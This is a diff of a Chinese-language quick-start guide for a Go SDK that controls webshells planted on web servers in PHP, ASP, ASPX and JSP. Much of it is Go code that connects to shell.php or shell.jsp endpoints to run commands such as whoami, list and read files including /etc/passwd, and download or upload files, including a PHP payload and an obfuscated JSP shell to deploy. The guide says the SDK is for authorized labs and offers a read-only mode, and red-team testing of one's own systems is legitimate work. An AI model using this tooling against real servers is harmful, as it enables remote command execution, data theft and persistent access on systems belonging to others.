@@ -1,16 +1,18 @@
 # 快速开始
 
-> ⚠️ **安全提示**：本 SDK 仅用于已获得书面授权的靶场 / 自有环境。请勿对未经授权的目标使用。
+> 仅在已获得书面授权的靶场、自有系统或测试环境中使用。
 
-## 1. 安装
+## 安装
+
+项目要求 Go 1.21 或更高版本：
 
 ```bash
 go get github.com/Yliken/redbeanshellcore
 ```
 
-要求 Go 1.21+。
+## PHP：创建 Client 并执行只读操作
 
-## 2. 一分钟跑起来
+PHP 适配器的 `ClientFactory` 会创建 `httpform.Transport`。主 payload 默认提交到 `antpwd` 字段，也可以通过 Session Metadata 修改。
 
 ```go
 package main
@@ -18,139 +20,107 @@ package main
 import (
     "context"
     "fmt"
-    "os"
     "time"
 
-    "github.com/Yliken/redbeanshellcore/core"
     "github.com/Yliken/redbeanshellcore/adapter/php"
+    "github.com/Yliken/redbeanshellcore/core"
     "github.com/Yliken/redbeanshellcore/registry/memory"
-    "github.com/Yliken/redbeanshellcore/transport/httpform"
 )
 
 func main() {
     ctx := context.Background()
+    reg := memory.New()
+    mgr, err := core.NewManager(reg, php.NewClientFactory())
+    if err != nil { panic(err) }
 
-    // 构造传输层
-    tr := httpform.New("https://lab.example/shell.php")
-    tr.Timeout = 30 * time.Second
+    err = mgr.Register(ctx, core.NodeConfig{
+        ID: "lab-01", Endpoint: "https://lab.example/shell.php",
+        Adapter: "php", Transport: "httpform",
+        Auth: map[string]string{"payload_form_field": "antpwd"},
+    })
+    if err != nil { panic(err) }
 
-    // 构造 client
-    client := core.NewClient(
-        core.WithSession(&core.Session{
-            NodeID:    "lab-01",
-            Endpoint:  "https://lab.example/shell.php",
-            Adapter:   "php",
-            Metadata:  map[string]string{"payload_form_field": "antpwd"},
-        }),
-        core.WithTransport(tr),
-    )
+    client, err := mgr.Client(ctx, "lab-01")
+    if err != nil { panic(err) }
 
-    // 获取系统信息
-    res, _ := client.Do(ctx, php.NewPhpInfo())
-    info := res.(*core.InfoResult)
-    fmt.Printf("workdir=%s\nos=%s\nuser=%s\n", info.Workdir, info.OS, info.User)
+    requestCtx, cancel := context.WithTimeout(ctx, 30*time.Second)
+    defer cancel()
+    result, err := client.Do(requestCtx, php.NewPhpInfo())
+    if err != nil { panic(err) }
+
+    info := result.(*core.InfoResult)
+    fmt.Printf("workdir=%s os=%s user=%s\n", info.Workdir, info.OS, info.User)
 }
 ```
 
-输出：
+也可以直接使用 `core.NewClient` 和 `httpform.New`，适合不需要节点注册表的单节点程序。
 
-```
-workdir=/var/www/html
-os=Linux lab01 5.4.0-generic x86_64
-user=www-data
-```
-
-## 3. 执行命令
+## 常用操作
 
 ```go
-res, _ := client.Do(ctx, php.NewPhpExec("whoami"))
-er := res.(*core.ExecResult)
-fmt.Println(er.Stdout)
+info, _ := client.Do(ctx, php.NewPhpInfo())
+exec, _ := client.Do(ctx, php.NewPhpExec("whoami"))
+list, _ := client.Do(ctx, php.NewPhpFileList("/etc"))
+read, _ := client.Do(ctx, php.NewPhpFileRead("/etc/hosts"))
+download, _ := client.Do(ctx, php.NewPhpFileDownload("/tmp/data.bin"))
+upload, _ := client.Do(ctx, php.NewPhpFileUpload("/tmp/out.txt", []byte("hello")))
 ```
 
-## 4. 文件操作
+返回值分别是 `*core.InfoResult`、`*core.ExecResult`、`*core.FileListResult`、`*core.FileReadResult` 或 `*core.BoolResult`。文件读取和下载的 `Data` 是二进制安全的 `[]byte`，不要先转成字符串再保存。
+
+命令操作支持指定 shell 和环境变量；上传默认为覆盖模式：
 
 ```go
-// 列目录
-res, _ := client.Do(ctx, php.NewPhpFileList("/etc"))
-flr := res.(*core.FileListResult)
-for _, e := range flr.Entries {
-    fmt.Printf("%s\n", e.Name)
-}
-
-// 读文件
-res, _ := client.Do(ctx, php.NewPhpFileRead("/etc/passwd"))
-frr := res.(*core.FileReadResult)
-fmt.Println(string(frr.Data))
-
-// 下载二进制文件
-res, _ = client.Do(ctx, php.NewPhpFileDownload("/tmp/data.bin"))
-download := res.(*core.FileReadResult)
-os.WriteFile("./data.bin", download.Data, 0600)
-
-// 上传文件
-data, _ := os.ReadFile("./local-payload.php")
-res, _ = client.Do(ctx, php.NewPhpFileUpload("/tmp/payload.php", data))
-up := res.(*core.BoolResult)
-fmt.Println(up.OK) // true 表示成功
+op := php.NewPhpExec("make").WithBin("/bin/bash").WithEnv("CC", "gcc")
+appendOp := php.NewPhpFileUpload("/tmp/log", []byte("next\n")).WithAppend(true)
 ```
 
-## 5. 多节点管理
+## ASP、ASPX 与 JSP
+
+四个适配器都提供 `info`、`exec`、`file.list`、`file.read`、`file.download`、`file.upload` 六类操作。
+
+- `adapter/asp`：经典 ASP/VBScript，提供 `NewClientFactory`。
+- `adapter/aspx`：ASP.NET/C#，提供 `NewClientFactory`。
+- `adapter/jsp`：Java/JSP，提供静态 Shell 和动态 Shell；其 `ClientFactory.NewClient` 明确返回错误，因此需要手动组装 Client。
+
+JSP 静态 Shell 的最小调用方式：
 
 ```go
-mgr := core.NewManager(memory.New(), php.NewClientFactory())
-
-// 注册节点
-mgr.Register(ctx, core.NodeConfig{
-    ID: "lab-a", Endpoint: "https://lab-a.example/shell.php",
-    Adapter: "php", Transport: "httpform",
-    Auth:  map[string]string{"payload_form_field": "antpwd"},
-    Tags:  []string{"lab"}, Group: "case-001",
-})
-
-// 获取 client
-cli, _ := mgr.Client(ctx, "lab-a")
-
-// 批量操作
-nodes, _ := mgr.List(ctx, core.NodeFilter{Group: "case-001"})
-for _, n := range nodes {
-    c, _ := mgr.Client(ctx, n.Config.ID)
-    c.Do(ctx, php.NewPhpInfo())
-}
+tr := httpform.New("https://lab.example/shell.jsp")
+sess := core.NewSession("jsp-01", "https://lab.example/shell.jsp")
+sess.Adapter = "jsp"
+client := core.NewClient(core.WithSession(sess), core.WithTransport(tr))
+result, err := client.Do(ctx, jsp.NewJspInfo())
 ```
 
-## 6. 环境变量预注册节点
+先用 `jsp.ShellSource()` 或 `jsp.ShellSourceWith(obf)` 生成并部署对应 JSP 文件，再使用同一份 `Obfuscator` 构造操作。`WithDynamic()` 依赖 JDK 6–14 的 Nashorn，JDK 15 及以上应使用默认静态模式。
 
-```bash
-export NODES="lab-a=http://example.com/shell.php;cmd,lab-b=http://example2.com/shell.php;cmd"
-go run main.go
-```
+## 只读策略与错误处理
 
-格式：`id1=url1;field1,id2=url2;field2`
-
-## 7. 中间件
+生产或批量读取场景建议启用只读中间件：
 
 ```go
 client := core.NewClient(
     core.WithSession(sess),
     core.WithTransport(tr),
-    core.WithMiddleware(
-        logging.Middleware(),     // 请求日志
-        audit.Middleware(),       // 审计事件
-        timeout.Middleware(timeout.Options{Timeout: 30 * time.Second}),
-        retry.Middleware(retry.Options{MaxAttempts: 3}),
-        readonly.Middleware(),    // 拦截写操作
-    ),
+    core.WithMiddleware(readonly.Middleware()),
 )
 ```
 
-Middleware 能观察 HTTP 状态、响应解码和 Operation.Parse 的最终错误；Retry 默认只对只读操作的网络错误与超时重试。
+`exec`、`file.upload` 和标记为写入/破坏性的操作会在进入 Transport 前被拒绝。错误统一为 `*core.OpError`，通过 `core.IsKind` 判断类别：
 
-## 常见问题
+```go
+if core.IsKind(err, core.ErrTimeout) { /* 超时 */ }
+if core.IsKind(err, core.ErrRemoteRuntime) { /* 远端模板报错 */ }
+if core.IsKind(err, core.ErrPolicyDenied) { /* 本地策略拦截 */ }
+```
 
-| 问题 | 原因 | 解决 |
-|------|------|------|
-| `workdir= os= user=` 全空 | 用了 `ops.NewInfo()` | 换成 `php.NewPhpInfo()` |
-| `sh: 1: -c: not found` | bin 路径为空 | 用 `php.NewPhpExec(cmd)` |
-| `transport 未配置` | Client 没有配置 Transport | 使用 `core.WithTransport(...)`；Manager 使用可用的自定义 ClientFactory |
-| `ErrPolicyDenied` | readonly 拦截 | 正常行为，写操作被阻止 |
+## 运行示例和测试
+
+```bash
+go run ./examples/jsp/
+go run ./examples/crypto/
+go test ./...
+```
+
+示例只演示模板生成、请求构建或本地 mock；真实请求必须替换为授权环境的 URL，并检查 TLS、代理和凭据配置。
